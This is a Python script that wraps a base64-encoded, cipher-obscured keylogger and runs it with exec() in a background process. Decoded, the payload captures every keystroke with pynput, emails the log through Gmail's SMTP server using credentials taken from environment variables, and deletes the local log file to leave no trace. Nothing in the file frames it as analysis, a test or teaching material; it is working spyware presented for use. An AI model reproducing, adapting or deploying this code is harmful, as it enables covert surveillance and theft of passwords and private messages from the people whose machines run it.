import multiprocessing
from multiprocessing import Process, freeze_support

from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import base64
import datetime
import time
from pynput.keyboard import Listener
import sys
import os
import smtplib
import concurrent.futures


code_ = '''CmltcG9ydCBkYXRldGltZQppbXBvcnQgdGltZQpmcm9tIHB5bnB1dC5rZXlib2FyZCBpbXBvcnQgTGlzdGVuZXIKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHNtdHBsaWIKCgpjbGFzcyBLZXlMb2dnZXI6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc2F2ZT1UcnVlLCBnbWFpbD1GYWxzZSwgdGltZXI9MCk6CiAgICAgICAgc2VsZi5jb3VudF9yc2hpZnRfcHJlc3MgPSAwCiAgICAgICAgc2VsZi50aW1lciA9IHRpbWVyCiAgICAgICAgaWYgc2VsZi50aW1lcjoKICAgICAgICAgICAgc2VsZi5zdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgICAgICBzZWxmLkxPRyA9ICIiCiAgICAgICAgc2VsZi5MT0dfRklMRSA9ICdrZXlzLmxvZycKICAgICAgICBzZWxmLmdtYWlsID0gZ21haWwKICAgICAgICBzZWxmLnNhdmUgPSBzYXZlCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICB3aXRoIExpc3RlbmVyKG9uX3ByZXNzPXNlbGYub3ApIGFzIGxpc3RlbmVyOgogICAgICAgICAgICBsaXN0ZW5lci5qb2luKCkKCiAgICAgICAgICAgIHNlbGYubG9nZ2VyKHNlbGYuTE9HX0ZJTEUsIHNlbGYuTE9HKQogICAgICAgICAgICBpZiBzZWxmLmdtYWlsOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX2dtYWlsKG9zLmVudmlyb25bJ0dNQUlMX1VTUiddLnN0cmlwKCksIG9zLmVudmlyb25bJ0dNQUlMX1JFQ1YnXS5zdHJpcCgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLmVudmlyb25bJ0dNQUlMX1BTV0QnXS5zdHJpcCgpLCBzZWxmLkxPRykKICAgICAgICAgICAgaWYgbm90IHNlbGYuc2F2ZToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLkxPR19GSUxFKQoKICAgIGRlZiBvcChzZWxmLCBrZXkpOgoKICAgICAgICBrZXlfcHJlc3MgPSAnJwoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGtleV9wcmVzcyA9IGtleS5uYW1lCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBrZXlfcHJlc3MgPSBzdHIoa2V5KQogICAgICAgIGlmIGtleV9wcmVzcyA9PSAnc2hpZnRfcic6ICAjIEtpbGwgc3dpdGNoIC0+IHJpZ2h0IHNoaWZ0CiAgICAgICAgICAgIHNlbGYuY291bnRfcnNoaWZ0X3ByZXNzICs9IDEKICAgICAgICAgICAgaWYgc2VsZi5jb3VudF9yc2hpZnRfcHJlc3MgPiAyOgogICAgICAgICAgICAgICAgc3lzLmV4aXQoKQoKICAgICAgICBpZiBrZXlfcHJlc3M6CiAgICAgICAgICAgIGxvZ19yZXN1bHQgPSBmIlxuIHtkYXRldGltZS5kYXRldGltZS5ub3coKS5zdHJmdGltZSgnJWQvJW0vJVksICVIOiVNOiVTJyl9IAkge2tleV9wcmVzc30iCiAgICAgICAgICAgIHNlbGYuTE9HICs9IGxvZ19yZXN1bHQKICAgICAgICAgICAgaWYgc2VsZi50aW1lcjoKICAgICAgICAgICAgICAgIGlmIHRpbWUudGltZSgpIC0gc2VsZi5zdGFydF90aW1lID4gc2VsZi50aW1lcjoKICAgICAgICAgICAgICAgICAgICBzeXMuZXhpdCgpCgogICAgZGVmIGxvZ2dlcihzZWxmLCBmaWxlOiBzdHIsIGxvZz0nJyk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4oZmlsZSwgJ3cnKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShsb2cpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCgogICAgZGVmIHNlbmRfZ21haWwoc2VsZiwgc2VuZGVyOiBzdHIsIHJlY2lwaWVudDogc3RyLCBwYXNzd29yZDogc3RyLCBtZXNzYWdlPSIiKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzbXRwbGliLlNNVFAoJ3NtdHAuZ21haWwuY29tJywgNTg3KQogICAgICAgICAgICBzLnN0YXJ0dGxzKCkKICAgICAgICAgICAgcy5sb2dpbihzZW5kZXIsIHBhc3N3b3JkKQogICAgICAgICAgICBzLnNlbmRtYWlsKHNlbmRlciwgcmVjaXBpZW50LCBtZXNzYWdlKQogICAgICAgICAgICBzLnF1aXQoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5zYXZlID0gVHJ1ZQogICAgICAgICAgICBzZWxmLmxvZ2dlcihmIntzZWxmLkxPR19GSUxFfSBFcnJvciA6IHtzdHIoZSl9XG5cbl9fX19fX19fX19PZmZsaW5lIExvZ2dpbmdfX19fX19fX19fXG5cbiB7c2VsZi5MT0d9IikKCgprZXlsb2cgPSBLZXlMb2dnZXIoc2F2ZT1GYWxzZSwgZ21haWw9VHJ1ZSkKa2V5bG9nLnJ1bigpCg=='''
code17 = '''b2cgPSBLZXlMb2dnZXIoc2F2ZT1GYWxzZSwgZ21haWw9VHJ1ZSkKa2V5bG9nLnJ1bigpCg=='''


key = ChaCha20Poly1305.generate_key()
encryption_type = ChaCha20Poly1305(key)
nonce = os.urandom(12)
encrypted_message = encryption_type.encrypt(nonce, base64.b64decode(code_), base64.b64decode(code17))
decrypted_message = encryption_type.decrypt(nonce, encrypted_message, base64.b64decode(code17))


def run():
    exec(decrypted_message)
    return


def main():
    Process(target=run).start()
    time.sleep(50)
    sys.exit(0)


if __name__ == '__main__':
    freeze_support()
    main()
